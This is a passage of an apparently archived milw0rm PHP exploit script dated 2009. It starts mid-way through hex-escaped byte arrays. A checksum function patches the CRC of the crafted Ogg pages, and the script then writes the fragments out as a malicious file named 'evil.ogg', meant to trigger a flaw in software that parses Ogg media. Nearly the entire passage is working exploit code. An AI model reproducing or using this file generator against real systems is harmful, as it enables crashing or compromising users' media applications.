"\x52\x4a\x29\x29\xa5\x94\x42\x08\x21\x84\x12\x4a\x29\xa5\x94\x52".
"\x52\x4a\x29\x85\x10\x42\x08\xa5\x94\x52\x4a\x29\xa5\xa4\x94\x52".
"\x0a\x21\x84\x10\x4a\x29\xa5\x94\x52\x4a\x49\x29\xa5\x14\x42\x09".
"\xa5\x94\x52\x4a\x29\xa5\x94\x92\x52\x4a\x29\xa5\x10\x4a\x29\xa5".
"\x94\x52\x4a\x29\x25\xa5\x94\x52\x4a\xa5\x94\x52\x4a\x29\xa5\x94".
"\x52\x4a\x4a\x29\xa5\x94\x4a\x29\xa5\x94\x52\x4a\x29\xa5\x94\x94".
"\x52\x4a\x29\x95\x52\x4a\x29\xa5\x94\x52\x4a\x29\x29\xa5\x94\x52".
"\x4a\xa9\x94\x52\x4a\x29\xa5\x94\x52\x52\x4a\x29\xa5\x94\x52\x29".
"\xa5\x94\x52\x4a\x29\xa5\xa4\x94\x52\x4a\x29\xa5\x52\x4a\x29\xa5".
"\x94\x52\x4a\x49\x29\xa5\x94\x52\x4a\xa5\x94\x52\x4a\x29\xa5\x94".
"\x92\x52\x4a\x29\xa5\x94\x52\x2a\xa5\x94\x52\x4a\x29\xa5\x00\x00".
"\xa0\x03\x07\x00\x80\x00\x23\x2a\x2d\xc4\x4e\x33\xae\x3c\x02\x47".
"\x14\x32\x4c\x40\x85\x86\xac\x04\x00\xc8\x00\x00\x10\x07\xb1\xb4".
"\xd6\x5a\xab\x8c\x72\xca\x49\x49\xad\x43\x46\x1a\xe6\xa0\xa4\xd8".
"\x49\x07\x21\xb5\x58\x4b\x65\x20\x41\xca\x49\x4a\x9d\x82\x08\x29".
"\x06\xa9\x85\x8c\x2a\xa5\x98\x93\x96\x42\xcb\x98\x52\x0c\x62\x2b".
"\x31\x74\x8c\x31\x47\x39\xe5\x54\x42\xc7\x18\x00\x00\x00\x82\x00".
"\x00\x03\x11\x32\x13\x08\x14\x40\x81\x81\x0c\x00\x38\x40\x48\x90".
"\x02\x00\x0a\x0b\x0c\x1d\xc3\x45\x40\x40\x2e\x21\xa3\xc0\xa0\x70".
"\x4c\x38\x27\x9d\x36\x00\x00\x41\x88";

function crcOgg (&$_x) 			
	{
	$crc=0;
	$polynom=0x04C11DB7; //polynomial generator
	for ($i=0; $i<strlen($_x); $i++)
		{
		$c = ord($_x[$i]);
		for ($j=0; $j<8; $j++)
			{
			$bit=0;
			if ($crc&0x80000000) $bit=1;
			if ($c&0x80) $bit^=1;
			$c<<=1;	$crc<<=1;
			if ($bit) $crc^=$polynom;
			}
		}
	$_x[22]=chr($crc&0xFF);       $_x[23]=chr(($crc>>8)&0xFF);
      $_x[24]=chr(($crc>>16)&0xFF); $_x[25]=chr(($crc>>24)&0xFF);
	}

crcOgg($_frgmnt2);

$_frgmnt3="\x4f\x67\x67\x53\x00\x01\x00".
"\x00\x00\x00\x00\x00\x00\x00\x66\x07\x00\x00\x02\x00\x00\x00\x6a".
"\xa0\x3f\xb6\x01\x91\xcc\x10\x89\x88\xc5\x20\x31\xa1\x1a\x28\x2a".
"\xa6\x03\x80\xc5\x05\x86\x7c\x00\xc8\xd0\xd8\x48\xbb\xb8\x80\x2e".
"\x03\x5c\xd0\xc5\x5d\x07\x42\x08\x42\x10\x82\x58\x1c\x40\x01\x09".
"\x38\x38\xe1\x86\x27\xde\xf0\x84\x1b\x9c\xa0\x53\x54\xea\x40\x00".
"\x00\x00\x00\x00\x1e\x00\xe0\x01\x00\x20\xd9\x00\x22\x22\xa2\x99".
"\xe3\xe8\xf0\xf8\x00\x09\x11\x19\x21\x29\x31\x39\x41\x11\x00\x00".
"\x00\x00\x00\x3b\x00\xf8\x00\x00\x48\x52\x80\x88\x88\x68\xe6\x38".
"\x3a\x3c\x3e\x40\x42\x44\x46\x48\x4a\x4c\x4e\x50\x02\x00\x00\x01".
"\x04\x00\x00\x00\x00\x40\x00\x01\x08\x08\x08\x00\x00\x00\x00\x00".
"\x04\x00\x00\x00\x08\x08\x4f\x67\x67\x53\x00\x04\x61\x18\x00\x00".
"\x00\x00\x00\x00\x66\x07\x00\x00\x03\x00\x00\x00\xa5\xbe\xcf\x36".
"\x09\x2c\x86\x63\x01\x01\x01\xfc\xff\x17\xd4\x1c\xf7\xd1\x45\xd0".
"\xfb\xcf\xce\x6b\x8e\xfb\xe8\x22\xe8\xfd\x67\xe7\x64\x90\x02\x19".
"\xc6\x08\x00\xe2\x46\x62\x05\x6b\x7f\xef\xb3\xd8\xfd\xfb\xef\xac".
"\xb4\x92\xc0\xef\x5f\x05\xda\x65\xfc\xf7\x48\x5f\xa4\x80\x51\x33".
"\x45\x8b\xa2\xa2\xcb\xf8\xef\x91\xbe\x48\x01\xa3\x66\x8a\x16\x45".
"\x05\x88\x64\x66\xa7\x33\x49\x34\x00\x00\x24\x90\x02\x10\x38\x15".
"\x20\x4c\x00\x24\x00\x00\x00\xd0\x0a\xaa\xd1\x50\x55\x4c\xd4\xd2".
"\x26\xab\x6a\x9a\x98\x34\xfe\x34\xba\xbd\x52\x1d\xc0\x80\x78\xc6".
"\xa2\x0c\x9d\xe4\x10\x40\x11\x35\xac\x61\xa3\x29\x50\xa4\x90\x08".
"\xd2\x8a\x76\x50\x7f\x1a\x5d\x2b\x55\x48\x00\x94\x52\x4a\x59\x0a".
"\x30\x62\x84\xd2\x96\x07\xc0\x18\xb0\x80\x62\x8d\xb7\xa0\x01\xc1".
"\x5a\x23\x80\x01\x00\x00\x9d\x00\x00\x00\x80\x00\xde\x65\xfc\xef".
"\x28\x5f\x4a\x81\xb1\xc9\x84\xe8\x32\xfe\x77\x94\x2f\xa5\xc0\xd8".
"\x64\x42\x80\x80\x24\x60\x31\x66\x22\x9d\x0a\x00\x20\x20\x01\x06".
"\x00\x00\x00\x80\x2f\x36\xb7\x2a\x7c\x65\xb2\xde\xba\x95\xb7\x4b".
"\x06\x72\xfe\xee\x5c\x00\xbe\x3e\xb3\xb9\x75\xab\x02\xf0\x06\x38".
"\x51\x51\x40\x2c\xad\xd9\x68\x05\xab\x36\x58\xd7\xa8\x02\x62\xb1".
"\x18\x80\xfb\x9c\xf9\x79\x73\xab\x02\x5b\xb7\x7e\xf8\xfc\x19\x0e".
"\x0e\x0e\xbe\x65\xfc\xf7\x48\x6f\x8c\x01\x0e\x90\x35\xdc\x7c\x8f".
"\x77\xdc\xc0\x34\xcc\x1c\x45\x29\x6a\x3e\xe8\x99\x51\xe2\xa8\x20".
"\x54\x90\x10\xe1\x24\x00\x00\x00\x00\x80\xfa\x30\x0c\x45\x44\x44".
"\xa4\x33\xcb\xb2\x52\xa9\x68\xb5\xda\xd5\x4a\x55\x55\x55\x5d\x96".
"\x65\xb1\xfd\xef\xbf\xff\x02\x5c\xc6\x86\x61\xb8\x7b\x79\x09\xac".
"\xa2\xaa\xaa\xaa\x4f\x18\x99\x29\x49\x52\xb4\x2c\xcb\xb2\x2c\xcb".
"\xb2\x2c\xcb\xb2\x2c\xdd\x4d\xd9\xa1\xaa\xae\x56\xab\xb5\x6b\xd7".
"\x6a\x57\xab\xd5\x6a\xb5\x5a\xd6\x75\xb5\x67\x06\x80\xcc\x0c\x0c".
"\xc3\x30\x0c\xc3\x70\xa5\x95\x56\x5a\xa9\x01\xa0\xaa\xec\x38\x8e".
"\xe3\x52\xad\x54\x2a\x95\x4a\xa5\x52\xa9\xa8\xaa\xaa\x2e\x8b\x67".
"\x88\x90\xa2\x28\x14\xbd\x5e\xaf\xd7\xeb\xf5\x8a\xa2\x14\x85\x88".
"\x88\x00\xac\xad\xad\xaa\xaa\xaa\x7f\xff\xfd\xf7\xdf\xaa\xaa\xaa".
"\x4f\x46\x78\xde\xdc\xdc\xdc\xdc\xa4\x14\x3a\x00\x00\x78\xc5\x55".
"\x55\x55\x55\x55\x55\x95\x87\xfa\xc0\x30\x0c\xeb\x00\x46\x7d\x18".
"\x86\x61\x18\x86\x97\xbc\xcf\xcf\xcf\xcf\xcf\x4f\x4f\x7d\x7d\x7d".
"\x7d\x7d\x3d\x80\x5d\x55\xf7\x7d\xdf\xb7\x6d\xff\xab\x00\xbe\x65".
"\xfc\xf7\x90\x6f\xac\x81\x35\x24\xeb\xa5\x6f\xcb\xf8\xdf\x2e\xdf".
"\x60\xe0\x40\x46\xc2\xb8\x34\xbd\x5e\xaf\xd7\xeb\xad\x61\xb3\x3a".
"\x83\xd8\xa5\x03\xe6\x18\x98\x04\x00\x00\x00\x60\xb1\xb5\xb1\xb7".
"\x77\xb4\x1a\x55\x3a\x1e\x4d\x4e\x35\xcc\x00\x80\x58\x2c\x56\x54".
"\x45\xbb\x6f\x54\xf6\x48\xb6\x99\x0f\xf9\x90\x0f\xb9\xca\x20\x6b".
"\x0d\xc2\x20\x0c\xc2\x20\x0c\xc2\x20\x0c\xc2\x20\x0c\xc2\x20\x8c".
"\xe2\x28\x8e\x2c\x6f\x6e\x6e\x6e\x1a\xd6\xe6\xe6\xe6\xe6\x66\x59".
"\x96\xa5\xd6\xc5\xb2\x2c\xcb\xb2\x2c\x16\x8b\xaa\xa8\x8a\xaa\xa8".
"\x7a\x6d\x55\xad\xaa\x8a\x5a\x2f\xe2\x1e\x80\x0c\xcb\xb2\xbc\x84".
"\x41\x18\x84\x41\x18\x84\x41\x18\x84\x41\x18\xac\xb2\x2c\x0b\x58".
"\x65\x59\x96\x65\x59\x96\x37\x0e\x32\x52\x5c\x94\x45\xa9\x54\xf4".
"\x15\x8d\x6e\x5d\xba\x75\xe9\xd4\xa1\x53\x87\xce\x35\x6b\x35\x5a".
"\xcd\x4a\x51\x95\x55\x96\x1b\x00\x00\x58\x9b\x00\xc0\x7a\x6b\xce".
"\xf9\xf6\xf6\xf6\xf6\x36\x0c\x2c\x0b\x80\x92\xe5\xcf\x9f\x3f\x7f".
"\xfe\xfc\xf9\xb3\x0b\x00\x23\xcb\x8a\x83\x30\x08\x83\x30\x08\x17".
"\xcb\xb2\x2c\x2b\xba\xf2\x00\x00\xd4\xca\xb2\x94\x65\x59\xd6\xba".
"\xac\xcb\xba\xac\x8b\x65\x59\xd3\x03\x00\xbc\x3f\x7f\xfe\xfc\xf9".
"\xf3\xe7\xcf\x00\x00";
$fp=fopen("evil.ogg","w+");
if (!$fp) {die("cannot create evil.ogg...");}
@fputs($fp,$_frgmnt1.$_frgmnt2.$_frgmnt3);
@fclose($fp);
?>

# milw0rm.com [2009-03-18]
